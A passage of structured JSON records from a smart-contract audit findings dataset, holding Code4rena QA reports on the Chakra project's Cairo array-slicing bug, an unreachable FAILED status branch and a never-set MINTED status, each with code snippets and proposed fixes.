Recommended Mitigation Steps\nTo fix the issue, remove the incorrect length calculation and directly use the `end` parameter to control the slicing range. Below is the corrected version of the function:\n```diff\nfn u128_array_slice(src: @Array<u128>, mut begin: usize, end: usize) -> Array<u128> {\n    let mut slice = ArrayTrait::new();\n-    let len = begin + end;\n    loop {\n-        if begin >= len {\n+        if begin >= end {\n            break ();\n        }\n        if begin >= src.len() {\n            break ();\n        }\n\n        slice.append(*src[begin]);\n        begin += 1;\n    };\n    slice\n}\n```\n\n\n## Assessed type\n\nInvalid Validation\n", "poc_md": "## Proof of Concept\nHere is the original function with the flaw:\n```cairo\nfn u128_array_slice(src: @Array<u128>, mut begin: usize, end: usize) -> Array<u128> {\n    let mut slice = ArrayTrait::new();\n@>    let len = begin + end;\n    loop {\n        if begin >= len {\n            break ();\n        }\n        if begin >= src.len() {\n            break ();\n        }\n\n        slice.append(*src[begin]);\n        begin += 1;\n    };\n    slice\n}\n```\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/utils.cairo#L427-L442\n\n**container:**\n# Vulnerability details\n\nThe `u128_array_slice` function contains an improper length calculation which can lead to invalid array slicing behavior. Specifically, the line `let len = begin + end;` incorrectly calculates `len` instead of directly using the `end` parameter as the endpoint for the slice range.\n\n**tools_used:**\n## Tools Used\nManual code review\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/utils.cairo#L427-L442\n\n\n# Vulnerability details\n\nThe `u128_array_slice` function contains an improper length calculation which can lead to invalid array slicing behavior. Specifically, the line `let len = begin + end;` incorrectly calculates `len` instead of directly using the `end` parameter as the endpoint for the slice range.\n\n## Impact\nThe incorrect length calculation can cause unintended behavior and potential out-of-bounds errors. This may lead to scenarios where the function does not correctly slice the array or attempts to access array elements beyond its length, causing runtime errors and potentially compromising the stability of the contract.\n\n## Proof of Concept\nHere is the original function with the flaw:\n```cairo\nfn u128_array_slice(src: @Array<u128>, mut begin: usize, end: usize) -> Array<u128> {\n    let mut slice = ArrayTrait::new();\n@>    let len = begin + end;\n    loop {\n        if begin >= len {\n            break ();\n        }\n        if begin >= src.len() {\n            break ();\n        }\n\n        slice.append(*src[begin]);\n        begin += 1;\n    };\n    slice\n}\n```\n## Tools Used\nManual code review\n\n## Recommended Mitigation Steps\nTo fix the issue, remove the incorrect length calculation and directly use the `end` parameter to control the slicing range. Below is the corrected version of the function:\n```diff\nfn u128_array_slice(src: @Array<u128>, mut begin: usize, end: usize) -> Array<u128> {\n    let mut slice = ArrayTrait::new();\n-    let len = begin + end;\n    loop {\n-        if begin >= len {\n+        if begin >= end {\n            break ();\n        }\n        if begin >= src.len() {\n            break ();\n        }\n\n        slice.append(*src[begin]);\n        begin += 1;\n    };\n    slice\n}\n```\n\n\n## Assessed type\n\nInvalid Validation\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/utils.cairo#L427-L442\n\n\n# Vulnerability details\n\nThe `u128_array_slice` function contains an improper length calculation which can lead to invalid array slicing behavior. Specifically, the line `let len = begin + end;` incorrectly calculates `len` instead of directly using the `end` parameter as the endpoint for the slice range.\n\n## Impact\nThe incorrect length calculation can cause unintended behavior and potential out-of-bounds errors. This may lead to scenarios where the function does not correctly slice the array or attempts to access array elements beyond its length, causing runtime errors and potentially compromising the stability of the contract.\n\n## Proof of Concept\nHere is the original function with the flaw:\n```cairo\nfn u128_array_slice(src: @Array<u128>, mut begin: usize, end: usize) -> Array<u128> {\n    let mut slice = ArrayTrait::new();\n@>    let len = begin + end;\n    loop {\n        if begin >= len {\n            break ();\n        }\n        if begin >= src.len() {\n            break ();\n        }\n\n        slice.append(*src[begin]);\n        begin += 1;\n    };\n    slice\n}\n```\n## Tools Used\nManual code review\n\n## Recommended Mitigation Steps\nTo fix the issue, remove the incorrect length calculation and directly use the `end` parameter to control the slicing range. Below is the corrected version of the function:\n```diff\nfn u128_array_slice(src: @Array<u128>, mut begin: usize, end: usize) -> Array<u128> {\n    let mut slice = ArrayTrait::new();\n-    let len = begin + end;\n    loop {\n-        if begin >= len {\n+        if begin >= end {\n            break ();\n        }\n        if begin >= src.len() {\n            break ();\n        }\n\n        slice.append(*src[begin]);\n        begin += 1;\n    };\n    slice\n}\n```\n\n\n## Assessed type\n\nInvalid Validation"}, "severity": null, "difficulty": null, "type": "qa", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": null, "Difficulty": null, "Type": "qa", "Finding ID": null, "Target": null, "Severity_normalized": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-338", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 338, "page_start": null, "title": "`settlement::receive_cross_chain_msg` breaks the invariant about updating the transaction status", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/settlement.cairo#L325\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L108\n\n\n# Vulnerability details\n\n## Impact\n\nOne of the invariants about the Settlement Contract in the README of the audit states that:\n\n`The status of a received cross-chain message can only transition from Unknow to either Success or Failed.`\n\nThe problem is that the `receive_cross_chain_msg()` function in `handler_erc20.cairo` either returns true or reverts so when it is used in the `settlement::receive_cross_chain_msg` the status of the tx can never be set to `FAILED`\n\n\n## Proof of Concept\nThis is `receive_cross_chain_msg()` in `handler_erc20.cairo`\n\n```solidity\n\nfn receive_cross_chain_msg(ref self: ContractState, cross_chain_msg_id: u256, from_chain: felt252, to_chain: felt252,\n        from_handler: u256, to_handler: ContractAddress, payload: Array<u8>) -> bool{\n\n            assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n            assert(self.support_handler.read((from_chain, from_handler)) &&\n                    self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n\n            let message :Message= decode_message(payload);\n            let payload_type = message.payload_type;\n            assert(payload_type == PayloadType::ERC20, 'payload type not erc20');\n            let payload_transfer = message.payload;\n            let transfer = decode_transfer(payload_transfer);\n            assert(transfer.method_id == ERC20Method::TRANSFER, 'ERC20Method must TRANSFER');\n            let erc20 = IERC20MintDispatcher{contract_address: self.token_address.read()};\n            let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n\n            if self.mode.read() == SettlementMode::MintBurn{\n                erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n            }else if self.mode.read() == SettlementMode::LockMint{\n                erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n            }else if self.mode.read() == SettlementMode::BurnUnlock{\n                token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n            }else if self.mode.read() == SettlementMode::LockUnlock{\n                token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n            }\n\n            return true;\n        }\n\n```\n\nIf we inspect the function we can see that there is no scenario where this function returns false. It will either revert in one of the assertions or just return true. This means that the status of the transaction in the `settlement::receive_cross_chain_msg()` will never be set to `FAILED` which means that it will remain `PENDING` or be set to `SUCCESS` which breaks the invariant:\n\n\n\n```solidity\n\n fn receive_cross_chain_msg(\n            ref self: ContractState,\n            cross_chain_msg_id: u256,\n            from_chain: felt252,\n            to_chain: felt252,\n            from_handler: u256,\n            to_handler: ContractAddress,\n            sign_type: u8,\n            signatures: Array<(felt252, felt252, bool)>,\n            payload: Array<u8>,\n            payload_type: u8,\n        ) -> bool {\n\n            ...\n\n            // call handler receive_cross_chain_msg\n            let handler = IHandlerDispatcher{contract_address: to_handler};\n>>          let success = handler.receive_cross_chain_msg(cross_chain_msg_id, from_chain, to_chain, from_handler, to_handler , payload);\n\n            let mut status = CrossChainMsgStatus::SUCCESS;\n>>          if success{\n>>              status = CrossChainMsgStatus::SUCCESS;\n            }else{\n                //@audit this is unreachable\n>>              status = CrossChainMsgStatus::FAILED;\n            }\n\n            ...\n        }\n```\nThis is where the status is set, the `success` variable can only be `true` so it will never go into the `else` block\n\n## Tools Used\n\nManual review\n\n## Recommended Mitigation Steps\n\nRemove the assertions in the `handler::receive_cross_chain_msg()`, replace them with if statements and just return false if the condition is not met.\n\n\n\n## Assessed type\n\nError\n", "sections": {"description_md": null, "impact_md": "## Impact\n\nOne of the invariants about the Settlement Contract in the README of the audit states that:\n\n`The status of a received cross-chain message can only transition from Unknow to either Success or Failed.`\n\nThe problem is that the `receive_cross_chain_msg()` function in `handler_erc20.cairo` either returns true or reverts so when it is used in the `settlement::receive_cross_chain_msg` the status of the tx can never be set to `FAILED`\n", "recommendation_md": "## Recommended Mitigation Steps\n\nRemove the assertions in the `handler::receive_cross_chain_msg()`, replace them with if statements and just return false if the condition is not met.\n\n\n\n## Assessed type\n\nError\n", "poc_md": "## Proof of Concept\nThis is `receive_cross_chain_msg()` in `handler_erc20.cairo`\n\n```solidity\n\nfn receive_cross_chain_msg(ref self: ContractState, cross_chain_msg_id: u256, from_chain: felt252, to_chain: felt252,\n        from_handler: u256, to_handler: ContractAddress, payload: Array<u8>) -> bool{\n\n            assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n            assert(self.support_handler.read((from_chain, from_handler)) &&\n                    self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n\n            let message :Message= decode_message(payload);\n            let payload_type = message.payload_type;\n            assert(payload_type == PayloadType::ERC20, 'payload type not erc20');\n            let payload_transfer = message.payload;\n            let transfer = decode_transfer(payload_transfer);\n            assert(transfer.method_id == ERC20Method::TRANSFER, 'ERC20Method must TRANSFER');\n            let erc20 = IERC20MintDispatcher{contract_address: self.token_address.read()};\n            let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n\n            if self.mode.read() == SettlementMode::MintBurn{\n                erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n            }else if self.mode.read() == SettlementMode::LockMint{\n                erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n            }else if self.mode.read() == SettlementMode::BurnUnlock{\n                token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n            }else if self.mode.read() == SettlementMode::LockUnlock{\n                token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n            }\n\n            return true;\n        }\n\n```\n\nIf we inspect the function we can see that there is no scenario where this function returns false. It will either revert in one of the assertions or just return true. This means that the status of the transaction in the `settlement::receive_cross_chain_msg()` will never be set to `FAILED` which means that it will remain `PENDING` or be set to `SUCCESS` which breaks the invariant:\n\n\n\n```solidity\n\n fn receive_cross_chain_msg(\n            ref self: ContractState,\n            cross_chain_msg_id: u256,\n            from_chain: felt252,\n            to_chain: felt252,\n            from_handler: u256,\n            to_handler: ContractAddress,\n            sign_type: u8,\n            signatures: Array<(felt252, felt252, bool)>,\n            payload: Array<u8>,\n            payload_type: u8,\n        ) -> bool {\n\n            ...\n\n            // call handler receive_cross_chain_msg\n            let handler = IHandlerDispatcher{contract_address: to_handler};\n>>          let success = handler.receive_cross_chain_msg(cross_chain_msg_id, from_chain, to_chain, from_handler, to_handler , payload);\n\n            let mut status = CrossChainMsgStatus::SUCCESS;\n>>          if success{\n>>              status = CrossChainMsgStatus::SUCCESS;\n            }else{\n                //@audit this is unreachable\n>>              status = CrossChainMsgStatus::FAILED;\n            }\n\n            ...\n        }\n```\nThis is where the status is set, the `success` variable can only be `true` so it will never go into the `else` block\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/settlement.cairo#L325\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L108\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\n\nManual review\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/settlement.cairo#L325\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L108\n\n\n# Vulnerability details\n\n## Impact\n\nOne of the invariants about the Settlement Contract in the README of the audit states that:\n\n`The status of a received cross-chain message can only transition from Unknow to either Success or Failed.`\n\nThe problem is that the `receive_cross_chain_msg()` function in `handler_erc20.cairo` either returns true or reverts so when it is used in the `settlement::receive_cross_chain_msg` the status of the tx can never be set to `FAILED`\n\n\n## Proof of Concept\nThis is `receive_cross_chain_msg()` in `handler_erc20.cairo`\n\n```solidity\n\nfn receive_cross_chain_msg(ref self: ContractState, cross_chain_msg_id: u256, from_chain: felt252, to_chain: felt252,\n        from_handler: u256, to_handler: ContractAddress, payload: Array<u8>) -> bool{\n\n            assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n            assert(self.support_handler.read((from_chain, from_handler)) &&\n                    self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n\n            let message :Message= decode_message(payload);\n            let payload_type = message.payload_type;\n            assert(payload_type == PayloadType::ERC20, 'payload type not erc20');\n            let payload_transfer = message.payload;\n            let transfer = decode_transfer(payload_transfer);\n            assert(transfer.method_id == ERC20Method::TRANSFER, 'ERC20Method must TRANSFER');\n            let erc20 = IERC20MintDispatcher{contract_address: self.token_address.read()};\n            let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n\n            if self.mode.read() == SettlementMode::MintBurn{\n                erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n            }else if self.mode.read() == SettlementMode::LockMint{\n                erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n            }else if self.mode.read() == SettlementMode::BurnUnlock{\n                token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n            }else if self.mode.read() == SettlementMode::LockUnlock{\n                token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n            }\n\n            return true;\n        }\n\n```\n\nIf we inspect the function we can see that there is no scenario where this function returns false. It will either revert in one of the assertions or just return true. This means that the status of the transaction in the `settlement::receive_cross_chain_msg()` will never be set to `FAILED` which means that it will remain `PENDING` or be set to `SUCCESS` which breaks the invariant:\n\n\n\n```solidity\n\n fn receive_cross_chain_msg(\n            ref self: ContractState,\n            cross_chain_msg_id: u256,\n            from_chain: felt252,\n            to_chain: felt252,\n            from_handler: u256,\n            to_handler: ContractAddress,\n            sign_type: u8,\n            signatures: Array<(felt252, felt252, bool)>,\n            payload: Array<u8>,\n            payload_type: u8,\n        ) -> bool {\n\n            ...\n\n            // call handler receive_cross_chain_msg\n            let handler = IHandlerDispatcher{contract_address: to_handler};\n>>          let success = handler.receive_cross_chain_msg(cross_chain_msg_id, from_chain, to_chain, from_handler, to_handler , payload);\n\n            let mut status = CrossChainMsgStatus::SUCCESS;\n>>          if success{\n>>              status = CrossChainMsgStatus::SUCCESS;\n            }else{\n                //@audit this is unreachable\n>>              status = CrossChainMsgStatus::FAILED;\n            }\n\n            ...\n        }\n```\nThis is where the status is set, the `success` variable can only be `true` so it will never go into the `else` block\n\n## Tools Used\n\nManual review\n\n## Recommended Mitigation Steps\n\nRemove the assertions in the `handler::receive_cross_chain_msg()`, replace them with if statements and just return false if the condition is not met.\n\n\n\n## Assessed type\n\nError\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/settlement.cairo#L325\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L108\n\n\n# Vulnerability details\n\n## Impact\n\nOne of the invariants about the Settlement Contract in the README of the audit states that:\n\n`The status of a received cross-chain message can only transition from Unknow to either Success or Failed.`\n\nThe problem is that the `receive_cross_chain_msg()` function in `handler_erc20.cairo` either returns true or reverts so when it is used in the `settlement::receive_cross_chain_msg` the status of the tx can never be set to `FAILED`\n\n\n## Proof of Concept\nThis is `receive_cross_chain_msg()` in `handler_erc20.cairo`\n\n```solidity\n\nfn receive_cross_chain_msg(ref self: ContractState, cross_chain_msg_id: u256, from_chain: felt252, to_chain: felt252,\n        from_handler: u256, to_handler: ContractAddress, payload: Array<u8>) -> bool{\n            \n            assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n            assert(self.support_handler.read((from_chain, from_handler)) && \n                    self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n\n            let message :Message= decode_message(payload);\n            let payload_type = message.payload_type;\n            assert(payload_type == PayloadType::ERC20, 'payload type not erc20');\n            let payload_transfer = message.payload;\n            let transfer = decode_transfer(payload_transfer);\n            assert(transfer.method_id == ERC20Method::TRANSFER, 'ERC20Method must TRANSFER');\n            let erc20 = IERC20MintDispatcher{contract_address: self.token_address.read()};\n            let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n           \n            if self.mode.read() == SettlementMode::MintBurn{\n                erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n            }else if self.mode.read() == SettlementMode::LockMint{\n                erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n            }else if self.mode.read() == SettlementMode::BurnUnlock{\n                token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n            }else if self.mode.read() == SettlementMode::LockUnlock{\n                token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n            }\n            \n            return true;\n        }\n\n```\n\nIf we inspect the function we can see that there is no scenario where this function returns false. It will either revert in one of the assertions or just return true. This means that the status of the transaction in the `settlement::receive_cross_chain_msg()` will never be set to `FAILED` which means that it will remain `PENDING` or be set to `SUCCESS` which breaks the invariant:\n\n\n\n```solidity\n\n fn receive_cross_chain_msg(\n            ref self: ContractState,\n            cross_chain_msg_id: u256,\n            from_chain: felt252,\n            to_chain: felt252,\n            from_handler: u256,\n            to_handler: ContractAddress,\n            sign_type: u8,\n            signatures: Array<(felt252, felt252, bool)>,\n            payload: Array<u8>,\n            payload_type: u8,\n        ) -> bool {\n           \n            ...\n\n            // call handler receive_cross_chain_msg\n            let handler = IHandlerDispatcher{contract_address: to_handler};\n>>          let success = handler.receive_cross_chain_msg(cross_chain_msg_id, from_chain, to_chain, from_handler, to_handler , payload);\n\n            let mut status = CrossChainMsgStatus::SUCCESS;\n>>          if success{\n>>              status = CrossChainMsgStatus::SUCCESS;\n            }else{\n                //@audit this is unreachable               \n>>              status = CrossChainMsgStatus::FAILED;\n            }\n\n            ...\n        }\n```\nThis is where the status is set, the `success` variable can only be `true` so it will never go into the `else` block\n\n## Tools Used\n\nManual review\n\n## Recommended Mitigation Steps\n\nRemove the assertions in the `handler::receive_cross_chain_msg()`, replace them with if statements and just return false if the condition is not met.\n\n\n\n## Assessed type\n\nError"}, "severity": null, "difficulty": null, "type": "qa", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": null, "Difficulty": null, "Type": "qa", "Finding ID": null, "Target": null, "Severity_normalized": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-342", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 342, "page_start": null, "title": "Status MINTED is never set for the Mint / Burn mode on Ethereum", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L388\n\n\n# Vulnerability details\n\n## Impact\n\nThe current functionality of the `ChakraSettlementHandler` does not set status MINTED for the Mint / Burn mode not handling the callback properly. This can lead to a violation of the spec and potential misbehavior as the information is monitored by the off-chain services.\n\n## Proof of Concept\n\nTake a look at how `CrossChainTxStatus` is set at the moment for the Mint / Burn mode:\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L383-389\n```\n    if (status == CrossChainMsgStatus.Success) {\n            if (mode == SettlementMode.MintBurn) {\n                _erc20_burn(address(this), create_cross_txs[txid].amount);\n            }\n\n            create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n        }\n\n```\n\nHowever, according to the spec, status MINTED should be assigned:\n\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/BaseSettlementHandler.sol#L23-29\n```\n  enum CrossChainTxStatus {\n        Unknow,\n        Pending,\n        Minted,\n        Settled,\n        Failed\n    }\n\n```\n\n## Tools Used\n\nManual review.\n\n## Recommended Mitigation Steps\n\nAssign status MINTED if the transaction was for Mint / Burn mode.\n\n\n## Assessed type\n\nOther\n", "sections": {"description_md": null, "impact_md": "## Impact\n\nThe current functionality of the `ChakraSettlementHandler` does not set status MINTED for the Mint / Burn mode not handling the callback properly. This can lead to a violation of the spec and potential misbehavior as the information is monitored by the off-chain services.\n", "recommendation_md": "## Recommended Mitigation Steps\n\nAssign status MINTED if the transaction was for Mint / Burn mode.\n\n\n## Assessed type\n\nOther\n", "poc_md": "## Proof of Concept\n\nTake a look at how `CrossChainTxStatus` is set at the moment for the Mint / Burn mode:\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L383-389\n```\n    if (status == CrossChainMsgStatus.Success) {\n            if (mode == SettlementMode.MintBurn) {\n                _erc20_burn(address(this), create_cross_txs[txid].amount);\n            }\n\n            create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n        }\n\n```\n\nHowever, according to the spec, status MINTED should be assigned:\n\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/BaseSettlementHandler.sol#L23-29\n```\n  enum CrossChainTxStatus {\n        Unknow,\n        Pending,\n        Minted,\n        Settled,\n        Failed\n    }\n\n```\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L388\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\n\nManual review.\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L388\n\n\n# Vulnerability details\n\n## Impact\n\nThe current functionality of the `ChakraSettlementHandler` does not set status MINTED for the Mint / Burn mode not handling the callback properly. This can lead to a violation of the spec and potential misbehavior as the information is monitored by the off-chain services.\n\n## Proof of Concept\n\nTake a look at how `CrossChainTxStatus` is set at the moment for the Mint / Burn mode:\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L383-389\n```\n    if (status == CrossChainMsgStatus.Success) {\n            if (mode == SettlementMode.MintBurn) {\n                _erc20_burn(address(this), create_cross_txs[txid].amount);\n            }\n\n            create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n        }\n\n```\n\nHowever, according to the spec, status MINTED should be assigned:\n\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/BaseSettlementHandler.sol#L23-29\n```\n  enum CrossChainTxStatus {\n        Unknow,\n        Pending,\n        Minted,\n        Settled,\n        Failed\n    }\n\n```\n\n## Tools Used\n\nManual review.\n\n## Recommended Mitigation Steps\n\nAssign status MINTED if the transaction was for Mint / Burn mode.\n\n\n## Assessed type\n\nOther\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L388\n\n\n# Vulnerability details\n\n## Impact\n\nThe current functionality of the `ChakraSettlementHandler` does not set status MINTED for the Mint / Burn mode not handling the callback properly. This can lead to a violation of the spec and potential misbehavior as the information is monitored by the off-chain services.\n\n## Proof of Concept\n\nTake a look at how `CrossChainTxStatus` is set at the moment for the Mint / Burn mode:\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L383-389\n```\n    if (status == CrossChainMsgStatus.Success) {\n            if (mode == SettlementMode.MintBurn) {\n                _erc20_burn(address(this), create_cross_txs[txid].amount);\n            }\n\n            create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n        }\n\n```\n\nHowever, according to the spec, status MINTED should be assigned:\n\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/BaseSettlementHandler.sol#L23-29\n```\n  enum CrossChainTxStatus {\n        Unknow,\n        Pending,\n        Minted,\n        Settled,\n        Failed\n    }\n\n```\n\n## Tools Used\n\nManual review.\n\n## Recommended Mitigation Steps\n\nAssign status MINTED if the transaction was for Mint / Burn mode.\n\n\n## Assessed type\n\nOther"}, "severity": null, "difficulty": null, "type": "qa", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": null, "Difficulty": null, "Type": "qa", "Finding ID": null, "Target": null, "Severity_normalized": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-368", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 368, "page_start": null, "title": "Array slicing in Cairo Utils is wrongly implemented", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L429\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L446\n\n\n# Vulnerability details\n\n## Impact\nArray slicing is done wrongly causing unintended values to end up in sliced array or possible out of bounds error.\n\n## Proof of Concept\nThe u128_array_slice and u64_array_slice functions are intended to return a slice (sub-array) of an input array src of u128 and u64 elements, starting from a specified begin index and ending at a specified end index. However, the current implementation wrongly calculates where the slicing is meant to end leading to a wrong slicing of the array.\n\n```\nlet len = begin + end;\n```\nThe len variable above used to determine the number of iterations of elements to be slices is calculated by adding the specified begin and end inputs. Which shouldnt be so, as in standard array slicing, the end represents the index at which the slicing stops. Therefore adding it to the begin index and using the sum as the point to stop the slicing will cause it return fewer or more elements than intended, or even fail to slice the array correctly due to an out of bounds error.\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nCalculate the len as follows:\n```\nif end > src.len() {\n    let len = src.len();\n}else {\n    let len = end;\n}\n```\n\n\n\n## Assessed type\n\nLoop\n", "sections": {"description_md": null, "impact_md": "## Impact\nArray slicing is done wrongly causing unintended values to end up in sliced array or possible out of bounds error.\n", "recommendation_md": "## Recommended Mitigation Steps\nCalculate the len as follows:\n```\nif end > src.len() {\n    let len = src.len();\n}else {\n    let len = end;\n}\n```\n\n\n\n## Assessed type\n\nLoop\n", "poc_md": "## Proof of Concept\nThe u128_array_slice and u64_array_slice functions are intended to return a slice (sub-array) of an input array src of u128 and u64 elements, starting from a specified begin index and ending at a specified end index. However, the current implementation wrongly calculates where the slicing is meant to end leading to a wrong slicing of the array.\n\n```\nlet len = begin + end;\n```\nThe len variable above used to determine the number of iterations of elements to be slices is calculated by adding the specified begin and end inputs. Which shouldnt be so, as in standard array slicing, the end represents the index at which the slicing stops. Therefore adding it to the begin index and using the sum as the point to stop the slicing will cause it return fewer 